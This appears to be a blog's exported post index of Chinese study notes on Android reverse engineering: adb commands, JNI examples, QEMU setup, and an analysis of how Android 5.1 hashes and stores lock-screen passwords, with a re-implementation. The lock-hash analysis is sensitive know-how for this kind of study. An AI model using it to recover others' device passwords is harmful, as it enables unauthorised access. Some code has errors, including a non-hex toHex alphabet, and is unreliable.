]\n​ eg: adb forward tcp:23946 tcp:23946 IDA 调试\n​ adb forwrd tcp:8700 jwdp:1786\n2.13 adb jdwp ​ 查看设备中可以被调试的应用的进程号\n​ adb jdwp\n2.14 adb logcat ​ 查看当前的日志信息\n​ adb logcat -s tag eg：adb logcat -s fb\n​ adb logcat | findstr pname/pip/keyword\n​ adb logcat | findstr 包\n​ 日志信息过滤\n3. shell 命令 这儿shell命令是指先运行adb shell 再执行命令 与非shell命令互通\n3.1 run-as ​ 在非root设备中查看指定debug模式的包名应用沙盒数据\n​ run-as [package name]\n3.2 ps ​ 查看设备进程信息或者指定进程的线程信息\n​ ps | grep 过滤内容\n​ ps -t [pid] 查看pid 对应的线程信息\n​\n3.3 pm clear ​ 清空指定包名的应用数据\n​ pm clear [packagename]\n3.4 pm install ​ 安装设备中的apk 同adb install\n3.5 pm uninstall ​ 卸载\n3.6 am start ​ 启动一个应用\n​ am start -n [packname]/[packname].[activity name]\n​ am start -D -n (以debug方式启动)\n3.7 am startservice ​ 启动一个服务\n​ am startservice -n [packagename]/[package name].[service name]\n3.8 am broadcast ​ 发送一个广播\n​ am broadcast -a [广播动作]\n3.9 netcfg ​ 查看设备的ip地址\n3.10 netstat ​ 查看设备的端口号信息\n3.11 app_process ​ 运行java代码\n​ app_process [运行代码目录]· [运行主类]\n​ eg:\n​ export CLASSPATH = /data/demo.jar\n​ exec /system/bin/app_process /data/cn.wdasdkl.Main\n3.12 dalvikvm ​ 运行dex文件\n​ dalvikvm -cp [dex文件] · [运行主类]\n​ 差不多同上的用处\n3.13 top ​ 查看当前应用CPU的消耗信息。\n​ top [-n/-m/-d/-s/-t]\n​ -m 最多显示多少个进程\n​ -n 刷新次数\n​ -d 刷新时间间隔\n​ -s 按那一列排序\n​ -t 显示线程信息而不是进程\n3.14 getprop ​ 查看系统属性\n​ getprop [属性值名称]\n​ eg：getprop ro.debuggable\n​ 查看设备的信息\n4 操作apk 命令 4.1 用aapt 命令操作apk命令 ​ 查看apk中的信息以及编辑apk程序包\n​ aapt dump xmltree [apk包] · [需要查看的资源文件]\n​ eg：aapt dump xmltree demp.apk AndroidManifest.xml\n4.2 用dexdump 操作dex 命令 ​ 查看dex的详细信息\n​ dexdump [dex文件路径]\n5 进程命令 1 ##### 5.1 查看当前进程的内存加载情况 ​ cat proc/[pid]/maps 查看当前进程的内存映射信息，比如加载了那些so文件，dex文件等等。\n5.2 查看进程的状态信息 ​ cat /proc/[pid]/status\n5.3 查看当前应用使用的端口号信息 ​ cat /proc /[pid] / net / tcp/ tcp6 /udp /udp6\n总结 ​ 这章就是一些会用到的命令，后面的学习必不可少的知识点。\n","date":"2018-08-16T02:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/","title":"Android应用安全防护和逆向分析-基础篇3"},{"content":"Android应用安全防护和逆向分析-基础篇2 一、 基础篇② 第二章 Android中NDK的开发 1. 相关环境 相关环境参考另外一篇文章Android安全和开发环境搭建\n2. JNI基础 2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多)) ​ 参考文章Android安全和开发环境搭建中的JNI开发章节\n2.2 JNIEnv类型和jobject类型 AS 默认自动生成 1 public native String stringFromJNI(); 1 2 3 4 5 Java_com_naivete_jni_1study_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = \u0026#34;Hello from C++\u0026#34;; return env-\u0026gt;NewStringUTF(hello.c_str()); JNIEnv类型\n通过JNIEnv* 指针就可以对Java端的代码进行操作\nJni的所有函数可以查看jni.h文件\n下面是一些函数eg：\nNewObject : 创建Java类中的对象。\nNewString : 创建Java类中的String对象。\nNewArray : 创建类型为Type的数组对象\nGetField: 获取型为Type的字段。\nSetFileld: 设置类型为Type的字段的值。\nGetStaticField: 获取类型为Type的static的字段。\nSetStaticField:设置类型为Typede的static的字段的值。\nCallMethod: 调用返回类型为Type的方法。\nCallStaticMethod: 调用返回值类型为Type的Static方法\n…..\nJobject参数obj\n如果native 方法不是static ,obj就代表native方法的实例。\n如果narive方法是static,obj 就代表native方法的类的class对象实例。\nJava和C++中的基本类型的映射关系：\n具体查看jni.h文件的详细说明\nJava类型 本地类型 JNI定义的别名 int long jint/jsize long _int64 jlong byte signed char jbyte boolean unsigned char jboolean char unsigned short jchar short short jshort float float jfloat double double jdouble Object _jobject* jobject jclass类型\njclass 表示java中的class 类：\nJNIEnv 类中有如下几个简单的函数可以取得jclass:\njclass FindClass( const char* clsName):通过类的名称来获取jclass\njcalss GetObjectClass( jobject obj ):通过对象实例来获取jcalss,相当于java 中的getclass方法\njclass GetSuperClass(jclass obj):通过jclass 可以获取其父类的jclass对象。\nnative中访问Java层代码\n常见的应用就是获取类的属性和调用类的方法\nJNi在jni.h头文件中定义了jfieldId、jmethodID类型分别代表JAVA端的属性和方法。\n使用JNI的以下方法来取得相应的jfieldId、jmethodID：\nGetFieldID、GetMethodID\nGetStaticFieldID、GetStaticMethodID\n查看jni.h中源函数\n1 GetFieldID(jclass clazz, const char* name, const char* sig) ​ 参数说明：\nclazz 方法依赖的类对象的class对象\nname: 字段的名称\nsig : 字段的签名\n查看签名命令\njavap -s -p 字节码.class 文件\nGetMethodID 也能够会的构造函数的jmethodID，创建一个Java对象是可以调用指定的构造方法，eg：\nenv-\u0026gt;GetmethodID(data_class,\u0026quot;\u0026lt;init\u0026gt;\u0026quot;,\u0026quot;()v\u0026quot;);\n签名的格式：\n类型 相应的签名 boolean Z byte B chat C short S int I long L float F double D void V object L用/分割包的完整类名；Ljava/lang/String; Array [签名 [I [Ljava/lang/Object Method (参数类型签名··· .) 返回值类型签名 eg:\n1 2 3 4 5 6 7 8 9 10 11 12 13 package com.naivete.jni_study; import java.util.Date; public class Hello { public int property; public int function(int foo, Date date,int[] arr){ System.out.println(\u0026#34;function\u0026#34;); return 0; } public native void test(); } 1 2 3 4 5 6 7 8 9 10 extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_test(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID field_prop = env-\u0026gt;GetFieldID(helloclazz,\u0026#34;property\u0026#34;,\u0026#34;I\u0026#34;); //取到property字段 jmethodID method_fun = env-\u0026gt;GetMethodID(helloclazz,\u0026#34;function\u0026#34;,\u0026#34;ILjava/util/Date;[I)I\u0026#34;); //取到function函数 env-\u0026gt;CallIntMethod(instance,method_fun,0L,NULL,NULL); } GetStaticFieldID与GetStaticMethodID这两个方法的用法大同小异。\n2.3 JNIEnv类型中方法的使用 在java中定义一个属性，再从C++代码中将其设置成另外的值 2.3.1 native中获取方法的ID 1 2 3 4 5 6 7 8 9 10 11 private static String TAG = \u0026#34;Hello\u0026#34;; public int number = 0; public native void sayHello(); public static void main() { Hello hello = new Hello(); hello.sayHello(); System.out.print(hello.number); Log.d(TAG, \u0026#34;\u0026#34;+hello.number); } } 1 2 3 4 5 6 7 8 9 10 JNIEXPORT void JNICALL Java_com_naivete_jni_1study_Hello_sayHello(JNIEnv *env, jobject instance) { // TODO jclass helloclazz = env-\u0026gt;GetObjectClass(instance); jfieldID id_number = env-\u0026gt;GetFieldID(helloclazz,\u0026#34;number\u0026#34;,\u0026#34;I\u0026#34;); //获取numberID jint number = env-\u0026gt;GetIntField(instance,id_number); //获取number的值; cout\u0026lt;\u0026lt;number\u0026lt;\u0026lt;endl; //输出到控制台 env-\u0026gt;SetIntField(instance,id_number,100L); //设置number的值;注意jint对应c++ long类型 } JNIEnv 还提供了许多CallMethod 和CallStaticMethod 还有CallNovirtualMethod函数，需要通过GetMethodID来取得相应的方法的jmethodId传入到上述函数的参数中\n调用示例方法的三种形式如下：\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,·······); //常用的方式\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,va_list lst); //有指向参数表的va_list变量（很少使用）\nCall\u0026lt;Type\u0026gt;Method(jobject obj,jmethodID id,id,jvalue * v); //有指向jvalue或jvalue数组指针时用的\njvalue 是union联合体，定义jvalue数组传递到方法中，这样可以包含多种类型的参数：\n1 2 3 4 5 6 7 8 9 10 11 typedef union jvalue{ jboolean z; jbytpe b; jchar c; jshort s; jint i; jlong j; jfloat f; jdouble d; jobject l; }jvalue; 比如在Java中有这样一个方法：\n1 2 3 4 5 boolean function(int a,double b,char c){ ····· } 1）在C++中使用第一种方法调用function方法：\nenv-\u0026gt;CallbooleanMethod(obj,id_function,10L，3.4，L'a')\nobj:functon对象，id_function:functiond的id,10L、3.4、L’a’是对应的参数。\nL’a’ 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。\n2）在C++中使用第三种方法function调用：\n1 2 3 4 5 6 jvalue* args = new Jvalue[3] args[0] = 10L; args[1] = 3.22; args[2] = L\u0026#39;a\u0026#39;; env-\u0026gt;GetBooleanMethod(obj,id_function,args); delete[] args; //是否指针堆内存 2.3.2 Java和C++中的多态机制 JNIEnv中的特殊方法CallNovirtualMethod。来帮助java调用Java中父类的方法。\n介绍了-C++和java多态的基础知识。\n步骤：\n获取obj中对象的class 对象 GetObjectClass(obj)\n获取java中father字段的id GetFieldID()\n获取father字段的对象类型 GetObjectField\n获取father对象的class对象 FindClass\n获取father对象中function方法ID GetMethodID()\n调用父类中的function方法（会执行子类的方法）CallvoidMethod\n调用父类中的function方法（会执行父类的方法）CallNonvirtualVoidMethod()\n2.4 创建Java对象及字符串的操作方法 2.4.1 native中创建Java对象 ​ 两种方法：\n第一种：\njobject Newobject(jclass clazz,jmethodID methodID,·····)\nclazz 需要创建的Java对象的Class对象。\nmethodID :传递一个方法的ID: 构造方法\n第三个参数：构造函数需要传入的参数值（默认不传递） 默认构造方法返回值签名始终是“()V”,方法的名称始终是“\n”。\n在C++中构造Java中的Date对象调用方法getTime():\n1 2 3 4 5 6 jclass clazz_date = env-\u0026gt;FindClass(\u0026#34;java/util/Date\u0026#34;); //获取date对象 jmethodID mid_date = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;\u0026lt;init\u0026gt;\u0026#34;,\u0026#34;()V\u0026#34;); //获取构造方法的ID jobject now = env-\u0026gt;NewObject(clazz_date,mid_date); //生成Date对象 jmethodID mid_date_getTime = env-\u0026gt;GetMethodID(clazz_date,\u0026#34;getTime()\u0026#34;,\u0026#34;()J\u0026#34;); //获取getTime的ID jlong time = env-\u0026gt;CallLongMethod(now,mid_date_getTime);//调用getTime返回时间 printf(\u0026#34;%I64d\u0026#34;,time); 第二种：\n用AllocObject函数创建一个对象，可以根据传入的jclass创建一个java对象，但是状态时未初始化的，在这个对象之前绝对要用CallNonvirtualVoidMethod来调用该jclass的构造函数这样可以延迟构造函数的调用。用的比较少。\neg：略；\n2.4.2 native中操作Java字符串 ​ Java-String对象是Unicode(UTF-16)码 一个字符总是占用两个字节 可以通过JNI接口将Java中的字符串转换到C++的宽字符串（wchar_t*),或者传回一个UTF-8编码的字符串（char * )到C++ 反过来同理。\nJNIEnv中的一些C++方法：\n1）获取字符串的长度：\n​ jsize GetStringLength(jstring j_msg)\n将jstring 对象拷贝到const jchar* 指针字符串： ​ //拷贝Java字符串并以UTF-8编码传入jstr:\n​ env-\u0026gt;GetStringRegion(jstring j_msg.jsize start,jszie len,jchar* jstr);\n​ ////拷贝Java字符串并以UTF-16编码传入jstr:\n​ env-\u0026gt;GetStringUTFRegion(jstring j_msg.jsize start,jszie len, char* jstr);\n生成一个jstring 对象 ​ jobject NewString(const jchar* jstr,int size);\n​ 将字符串指针jstr转换成jstring。\n将jstring对象转换成const jchar* 字符串指。 GetStringChars 开内存 指针指向先开的内存\nconst* jchar * GetStringChars(jstring j_msg,jboolean* copied)\n返回一个UTF-16编码的宽字符串（jchar*);\n对应的释放内存方法：\nReleaseStringChars(jstring j_msg,const jchar* jstr)\nGetStringUTFChars 不开内存直接指向Java中string的指针\nconst char* GetStringUTFChars(jstring str,jboolean* copied)\n取得UTF-8编码的字符串\n释放：\nReleaseStringUTFChars(jstring j_msg,const jchar* jstr)\n将jstring 对象转化成const jchar* 字符串指针： ​ const jchar* GetStringCritical(jstring j_msg,Jboolean* copied)\n​ 作用:增加直接传回指向Java字符串的指针的可能性（而不是拷贝）；\n​ 在GetStringCritical/ReleaseStringCritical之间的关键区域之间不能调用任何其他JNI函数。否则会造成关键区域代码执行期间垃圾回收器停止工作。任何触发垃圾回收器的的线程也将暂停。\n​ 释放：\n​ ReleaseStringCritical(jstring j_msg,const jchar* jstr)\n实例eg：（与书上不同,思路大概相同）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public class MainActivity extends AppCompatActivity { private EditText et; private TextView tv; private Button bt; public String text = null; // Used to load the \u0026#39;native-lib\u0026#39; library on application startup. static { System.loadLibrary(\u0026#34;native-lib\u0026#34;); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); et = findViewById(R.id.editText); tv = findViewById(R.id.tv); bt = findViewById(R.id.button); bt.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { text = et.getText().toString().trim(); callCppFunction(); tv.setText(text); } }); } public native void callCppFunction(); } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 #include \u0026lt;jni.h\u0026gt; #include \u0026lt;string\u0026gt; #include\u0026lt;iostream\u0026gt; #include\u0026lt;algorithm\u0026gt; using namespace std; extern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_example_naivete_jnidemo_MainActivity_callCppFunction(JNIEnv *env, jobject instance) { // TODO //获取text jfieldID fid_tx = env-\u0026gt;GetFieldID(env-\u0026gt;GetObjectClass(instance),\u0026#34;text\u0026#34;,\u0026#34;Ljava/lang/String;\u0026#34;); //获取ext对象 jstring j_tx = (jstring)env-\u0026gt;GetObjectField(instance,fid_tx); //第一种方式 //获得字符串指针： const jchar* jstr1 = env-\u0026gt;GetStringChars(j_tx,NULL); //z转换成宽字符 wstring wstr((const wchar_t*)jstr1); //释放指针 env-\u0026gt;ReleaseStringChars(j_tx,jstr1); //第一种END //第二种 const jchar * jstr2 = env-\u0026gt;GetStringCritical(j_tx,NULL); wstring wstr2((const wchar_t*)jstr2); env-\u0026gt;ReleaseStringCritical(j_tx,jstr2); //END //第三种 jsize len = env-\u0026gt;GetStringLength(j_tx); //获取长度 jchar * jstr3 = new jchar[len+1]; jstr3[len]=L\u0026#39;\\0\u0026#39;; //复制 env-\u0026gt;GetStringRegion(j_tx,0,len,jstr3); wstring wstr3((const wchar_t*)jstr3); delete[] jstr3; //End //倒序 reverse(wstr.begin(),wstr.end()); jstring j_new_str = env-\u0026gt;NewString((const jchar*)wstr.c_str(),(jint)wstr.size()); env-\u0026gt;SetObjectField(instance,fid_tx,j_new_str); } ​\n2.5 C/C++中操作Java中的数组 ​ 在java中数组分为两种：\n基本类型数组\n对象类型数组\n一个能用于两种不同类型数组的函数是：GetArrayLength(jarray array)。\n2.5.1 操作基本类型的数组 GetArrayElements方法Get\u0026lt;Type\u0026gt;ArrayElements(\u0026lt;Type\u0026gt;Array arr,jboolean* isCopide)\n把Java中的基本类型的数组转换成C++中的数组 两种方式：\n一是拷贝一份传回本地，另外一种是把指向Java数组的指针直接传回到本地代码中\n处理完后，通过ReleaseArrayelements 来释放数组。\nReleaseArrayelement 方法Release\u0026lt;Type\u0026gt;Arrayelement(Type\u0026gt;Array arr,\u0026lt;Type\u0026gt;* array,jint mode)\n这个函数可以选择如何处理Java和C++中的数组，是提交还是撤销····内存是否释放等等。\nmode的取值：\n0：对Java的数组进行更新并且释放C/C++数组\nJNI_COMMIT：更新但是不释放\nJNI_ABOUT：不更新，释放。\nGetPrimittiveArrayCritical方法\nGetPrimittiveArrayCritical(jarray arr,jboolean* isCopied)\nReleasePrimittiveArrayCritical方法\nReleasePrimittiveArrayCritical(jarray arr,void* array,jint mode)\nGetArrayRegion方法Get\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,\u0026lt;Type\u0026gt;* buffer)\n在C++中开辟内存，拷贝数组到内存中。\nSetArrayRegionSet\u0026lt;type\u0026gt;ArrayRegion(\u0026lt;Type\u0026gt;Arryay arr,jsize strat ,jsize len,const \u0026lt;Type\u0026gt;* buffer)\n把Java基本类型数组中的指定范围的元素用C++数组中的元素来赋值。\nArrayNew方法\u0026lt;Type\u0026gt;ArrayNew\u0026lt;Type\u0026gt;Array(jszie sz)\n指定一个长度然后返回相应的Java基本类型的数组。\n2.5.2 操作对象数组类型 ​ JNI未提供把Java对象数组 直接转到C++对象数组的函数。而是通过Get/SetObjectArrayaElement这样的函数来对java中的对象数组进行操作。因为未拷贝 所以没有释放操作。NewObjectArray可以通过指定长度和初始值来创建某一个类的数组。\n例子：两种类型的操作：\n略·····\n​ 注：书本P34-36\n2.6 C++/C中的引用类型和ID缓存 2.6.1 引用类型 ​ 从Java创建对象传到本地C/C++代码时会产生引用，根据Java的垃圾回收机制，只要存在引用就不会触发改引用所指的Java对象垃圾回收。\n​ 几种C/C++中的引用类型：\n局部引用：（最常见）\n局部引用只在该native函数中有用，所有在该函数中产生的局部引用，都会在函数返回时自动释放，也可以使用DeleteLocalRef函数手动释放。\n有效期中能传递到别的本地函数中，千万不要用C++全局变量保存它，或者把它定义为C++静态局部变量。\n全局引用：\n可以跨越当前线程，在对个native函数中有效，需要手动释放。会阻止垃圾回收器回收这个引用所指的对象。\n不同于局部引用，全局引用的创建不是由JNI自动创建的，全局引用是需要调用NewGlobalRef函数，释放使用ReleaseGlobalRef函数。\n弱全局引用\n与全局引用相似。不一样的为不会阻止垃圾回收器回收这个引用所指对象，使用NewWeakGlobalRef和ReleaseWeakGlobalRef来产生和释放。\n关于引用的一些函数：\njobject NewGlobalRef(jobject obj)\njobject NewLocalRef(jobject obj)\njobject New WeakGlobalRef(jobject obj)\nvoid DeleteGlobalRef(jobject obj)\nvoid DeleteLocalRef(jobject obj)\nvoid DeleteWeakGlobalRef(jobject obj)\n很容易理解上面6个函数\njboolean IsSameObject(jobject obj1,jobject obj2)\n这个函数用来比较两个引用是否相等，但是对于弱引用有一个特别的功能，如果把NULL传入要比较的对象中就能判断弱全局引用所指的Java对象是否被回收。\n缓存jfieldID/jmethodID.减小查询开销。\n2.6.2 缓存方法 在用的时候缓存\n在native代码中使用static局部变量来保存已经查询过的id,就缓存下了id。\n在Java类初始化时缓存\n比较好的方法，在native调用前把所有ID全部保存下来。可以让Java代码在第一次加载这个类的时候首先调用本地代码初始化所有的jfildID/jmethodID.这样可以省去多次确定ID是否存在的语句。这些jfildID/jmethodID定义在C++的全局。当java类卸载或者重新加载的时候，也会重新计算ID.\n1 2 3 4 5 6 7 8 9 10 public class TestNative{ static{ initNativeIDs(); //静态代码块进行初始化 } static native void initNativeIDs(); int propInt = 0; String propStr = \u0026#34;\u0026#34;; public native void otherNative(); ··········· } 1 2 3 4 5 6 7 8 9 10 jfieldID g_propInt_id = 0; jfieldID g_propStr_id = 0; JNIEXPORT void JNICALL Java_····init（JNIEnv* env,jobject clazz）{ jfieldID g_propInt_id = GetfieldID(clazz,\u0026#34;propInt\u0026#34;,\u0026#34;I\u0026#34;); jfieldID g_propStr_id = GetfieldID(clazz,\u0026#34;propStr\u0026#34;,\u0026#34;/Ljava/lang/String;\u0026#34;); } JNIEXPORT void JNICALL Java_····other（JNIEnv* env,jobject clazz）{ ············ } 总结 ​ 主要是NDK开发相关。\n​ 感觉系统的学了一遍还是感觉不错的。\n可以多找网上的例子来练习练习，加深对JNI 的了解。\n","date":"2018-08-16T00:00:00+08:00","permalink":"https://ykiko.top/p/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%872/","title":"Android应用安全防护和逆向分析-基础篇2"},{"content":"QUME的安装使用(补充) QEMU的安装使用 安装 WIndows：https://qemu.weilnetz.de/w64/ 下载exe安装就行\nMACOS:brew install qemu or sudo port install qemu\nLINUX：\nArch: pacman -S qemu\nDebian/Ubuntu: apt-get install qemu\nFedora: dnf install @virtualization\nGentoo: emerge --ask app-emulation/qemu\nRHEL/CentOS: yum install qemu-kvm\nSUSE: zypper install qemu\n源码安装：https://download.qemu.org/\nwget\n1 2 3 4 5 wget https://download.qemu.org/qemu-3.0.0-rc1.tar.xz tar xvJf qemu-3.0.0-rc1.tar.xz cd qemu-3.0.0-rc1 ./configure make git\n1 2 3 4 5 6 git clone git://git.qemu.org/qemu.git cd qemu git submodule init git submodule update --recursive ./configure make 最新的开发发生在主分支上。稳定的树位于名为“稳定x”的分支中。YY分支,X。YY是发布版本。\n树莓派内核制作（在windows上) 下载树莓派系统：http://downloads.raspberrypi.org/raspbian/images/\n下载qume 的树莓派内核： https://github.com/dhruvvyas90/qemu-rpi-kernel 改名为kernel-qemu放在和系统镜像同目录下\n放在了raspbia目录下\nqemu-system-arm.exe -kernel kernel-qemu -cpu arm1176 -m 512 -M versatilepb -dtbversatile-pb.dtb -no-reboot -append \u0026quot;root=/dev/sda2 panic=1rootfstype=ext4 rw\u0026quot; -net nic -net user,hostfwd=tcp::5022-:22 -hda 2018-06-27-raspbian-stretch.img\n注意自己下载的镜像版本\nLinux上 待补充。。。\n","date":"2018-08-09T00:00:00+08:00","permalink":"https://ykiko.top/p/qume%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%A1%A5%E5%85%85/","title":"QUME的安装使用(补充)"},{"content":"Android应用安全防护和逆向分析-基础篇1 第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式： 手势\n九宫格连线\n输入密码\n指纹、人脸、虹膜\n可穿戴设备\n2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类\n路径：Android-5.1.1\\frameworks\\base\\core\\java\\com\\android\\internal\\widget\n2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); //首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.length); System.arraycopy(md5, 0, combined, sha1.length, md5.length); //装换成hex值 再拼接起来 final char[] hexEncoded = HexEncoding.encode(combined); return new String(hexEncoded).getBytes(StandardCharsets.UTF_8); } catch (NoSuchAlgorithmException e) { throw new AssertionError(\u0026#34;Missing digest algorithm: \u0026#34;, e); } } 如何获取设备对应的salt值：\n1 2 3 4 5 6 7 8 9 10 11 12 13 private String getSalt(int userId) { long salt = getLong(LOCK_PASSWORD_SALT_KEY, 0, userId); if (salt == 0) { //值为0 重新生成 try { salt = SecureRandom.getInstance(\u0026#34;SHA1PRNG\u0026#34;).nextLong(); setLong(LOCK_PASSWORD_SALT_KEY, salt, userId); //保存值 Log.v(TAG, \u0026#34;Initialized lock password salt for user: \u0026#34; + userId); } catch (NoSuchAlgorithmException e) { throw new IllegalStateException(\u0026#34;Couldn\u0026#39;t get SecureRandom number\u0026#34;, e); } } return Long.toHexString(salt); // hex之后返回 } 继续跟踪 看保存的地方\n1 2 3 4 5 6 7 private long getLong(String secureSettingKey, long defaultValue, int userHandle) { try { return getLockSettings().getLong(secureSettingKey, defaultValue, userHandle); } catch (RemoteException re) { return defaultValue; } } 继续跟踪代码\n1 2 3 4 5 6 7 8 9 @VisibleForTesting public ILockSettings getLockSettings() { if (mLockSettingsService == null) { ILockSettings service = ILockSettings.Stub.asInterface( ServiceManager.getService(\u0026#34;lock_settings\u0026#34;)); //获取服务来操作 mLockSettingsService = service; } return mLockSettingsService; } 在android中 这种获取服务的方式最终实现逻辑都是在XXXService类中\n这里在LockSettingService.java中 找到这个类的getLong方法\n1 2 3 4 5 public long getLong(String key, long defaultValue, int userId) { checkReadPermission(key, userId); String value = getStringUnchecked(key, null, userId); return TextUtils.isEmpty(value) ? defaultValue : Long.parseLong(value); } 保存在数据库？\n继续跟踪\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 static class Injector { protected Context mContext; public Injector(Context context) { mContext = context; } public Context getContext() { return mContext; } public Handler getHandler() { return new Handler(); } public LockSettingsStorage getStorage() { final LockSettingsStorage storage = new LockSettingsStorage(mContext); storage.setDatabaseOnCreateCallback(new LockSettingsStorage.Callback() { @Override public void initialize(SQLiteDatabase db) { // Get the lockscreen default from a system property, if available boolean lockScreenDisable = SystemProperties.getBoolean( \u0026#34;ro.lockscreen.disable.default\u0026#34;, false); if (lockScreenDisable) { storage.writeKeyValue(db, LockPatternUtils.DISABLE_LOCKSCREEN_KEY, \u0026#34;1\u0026#34;, 0); } } }); return storage; } public LockSettingsService(Context context) { this(new Injector(context)); } 继续 查看LockSettingsStorage.java 类中 存在数据库中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 static class DatabaseHelper extends SQLiteOpenHelper { private static final String TAG = \u0026#34;LockSettingsDB\u0026#34;; private static final String DATABASE_NAME = \u0026#34;locksettings.db\u0026#34;; private static final int DATABASE_VERSION = 2; private static final int IDLE_CONNECTION_TIMEOUT_MS = 30000; private Callback mCallback; public DatabaseHelper(Context context) { super(context, DATABASE_NAME, null, DATABASE_VERSION); setWriteAheadLoggingEnabled(true); // Memory optimization - close idle connections after 30s of inactivity setIdleConnectionTimeout(IDLE_CONNECTION_TIMEOUT_MS); } public void setCallback(Callback callback) { mCallback = callback; } private void createTable(SQLiteDatabase db) { db.execSQL(\u0026#34;CREATE TABLE \u0026#34; + TABLE + \u0026#34; (\u0026#34; + \u0026#34;_id INTEGER PRIMARY KEY AUTOINCREMENT,\u0026#34; + COLUMN_KEY + \u0026#34; TEXT,\u0026#34; + COLUMN_USERID + \u0026#34; INTEGER,\u0026#34; + COLUMN_VALUE + \u0026#34; TEXT\u0026#34; + \u0026#34;);\u0026#34;); } @Override public void onCreate(SQLiteDatabase db) { createTable(db); if (mCallback != null) { mCallback.initialize(db); } } @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int currentVersion) { int upgradeVersion = oldVersion; if (upgradeVersion == 1) { // Previously migrated lock screen widget settings. Now defunct. upgradeVersion = 2; } if (upgradeVersion != DATABASE_VERSION) { Log.w(TAG, \u0026#34;Failed to upgrade database!\u0026#34;); } } } 看到了数据库的名字叫作：locksettings.db 保存在了：\n1 2 3 4 5 6 7 8 private static final String SYSTEM_DIRECTORY = \u0026#34;/system/\u0026#34;; //目录 private static final String LOCK_PATTERN_FILE = \u0026#34;gatekeeper.pattern.key\u0026#34;; private static final String BASE_ZERO_LOCK_PATTERN_FILE = \u0026#34;gatekeeper.gesture.key\u0026#34;; private static final String LEGACY_LOCK_PATTERN_FILE = \u0026#34;gesture.key\u0026#34;; //key1 private static final String LOCK_PASSWORD_FILE = \u0026#34;gatekeeper.password.key\u0026#34;; private static final String LEGACY_LOCK_PASSWORD_FILE = \u0026#34;password.key\u0026#34;; //key2 private static final String CHILD_PROFILE_LOCK_FILE = \u0026#34;gatekeeper.profile.key\u0026#34;; private static final String SYNTHETIC_PASSWORD_DIRECTORY = \u0026#34;spblob/\u0026#34;; 数据库文件存在/data/system/locksetting.db\n测试 在/data/system/下看到password.key\n打开看看：\n手动简单实现加密算法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public byte[] passwordToHash(String password) { if (password == null) { return null; } byte [] hashed = null; try { byte[] saltedPassword = (password + SALT).getBytes(); //SALT 值从数据库中得到 拿到之后进行hex转换 byte[] sha1 = MessageDigest.getInstance(\u0026#34;SHA-1\u0026#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(\u0026#34;MD5\u0026#34;).digest(saltedPassword); hashed = (toHex(sha1)+toHex(md5)).getBytes(); } catch(Exception e){ } return hashed; } private static String toHex(byte[] ary){ final String hex = \u0026#34;102031398sjdfklaj\u0026#34;; String ret = \u0026#34;\u0026#34;; for(int i=0;i\u0026lt;ary.length;i++){ ret += hex.charAt((ary[i]\u0026gt;\u0026gt; 4)\u0026amp; 0xf); ret += hex.charAt(ary[i]\u0026amp; 0xf); } return ret; } SALT 的值可以从数据库中拿到 也可以利用反射获取\n总结：\n​ MD5(输的明文密码+设备的salt).hex+ SHA1(输的的明文密码+设备的salt值).hex\n2.2 手势密码分析\n大致同上\n3. 简要： ​ 九宫格团装化成字节数组-\u0026gt;sha1 加密 即可\n其实大致流程和分析输入密码差不多 保存到本地的目录/data/system/gesture.key 